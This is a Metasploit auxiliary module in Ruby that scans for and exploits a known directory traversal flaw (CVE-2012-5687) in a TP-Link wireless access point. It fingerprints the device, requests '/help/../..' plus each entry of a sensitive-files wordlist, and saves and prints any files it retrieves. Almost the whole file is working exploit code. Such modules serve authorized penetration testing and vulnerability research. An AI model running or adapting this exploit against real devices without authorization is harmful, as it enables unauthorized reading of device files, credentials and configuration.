##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'TP-Link Wireless Lite N Access Point Directory Traversal Vulnerability',
      'Description' => %q{
          This module tests whether a directory traversal vulnerability is present in
        versions of TP-Link Access Point 3.12.16 Build 120228 Rel.37317n.
      },
      'References'  =>
        [
          [ 'CVE', '2012-5687' ],
          [ 'OSVDB', '86881' ],
          [ 'BID', '57969' ],
          [ 'EDB', '24504' ],
          [ 'URL', 'http://www.tp-link.com/en/support/download/?model=TL-WA701ND&version=V1' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-011' ]
        ],
      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "sensitive_files.txt") ]),
      ], self.class)
  end

  def extract_words(wordfile)
    return [] unless wordfile && File.readable?(wordfile)
    begin
      words = File.open(wordfile, "rb") do |f|
        f.read
      end
    rescue
      return []
    end
    save_array = words.split(/\r?\n/)
    return save_array
  end

  def find_files(file)
    traversal = '/../..'

    res = send_request_cgi(
      {
        'method'  => 'GET',
        'uri'     => '/help' << traversal << file,
        })

    return if res.nil?
    return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)
    return if (res.code == 404)
    return if (res.code == 501)

    if (res and res.code == 200 and res.body !~ /\<\/HTML/)
      out = false

      print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
      report_web_vuln({
        :host     => rhost,
        :port     => rport,
        :vhost    => datastore['VHOST'],
        :path     => "/",
        :pname    => normalize_uri(traversal, file),
        :risk     => 3,
        :proof    => normalize_uri(traversal, file),
        :name     => self.fullname,
        :category => "web",
        :method   => "GET"
        })

      loot = store_loot("tplink.traversal.data","text/plain",rhost, res.body,file)
      vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")

      if datastore['VERBOSE'] == true
        vprint_good("#{rhost}:#{rport} - Response - File #{file}:")
        res.body.each_line do |line|
          #the following is the last line of the useless response
          if line.to_s =~ /\/\/--><\/SCRIPT>/
            #setting out = true to print all of the following stuff
            out = true
            next
          end
          if out == true
            if line =~ /<META/ or line =~ /<Script/
              #we are finished :)
              #the next line is typical code from the website and nothing from us
              #this means we can skip this stuff ...
              out = false
              next
            else
              #it is our output *h00ray*
              #output our stuff ...
              print_line("#{line}")
            end
          end
        end
        out = false
      end
    elsif (res and res.code)
      vprint_error("#{rhost}:#{rport} - File->#{file} not found")
    end
  end

  def run_host(ip)

    begin
      vprint_status("#{rhost}:#{rport} - Fingerprinting...")
      res = send_request_cgi(
        {
          'method'  => 'GET',
          'uri'	 => '/',
        })

      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /TP-LINK Router/)

    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end

    extract_words(datastore['SENSITIVE_FILES']).each do |files|
      find_files(files) unless files.empty?
    end

  end
end
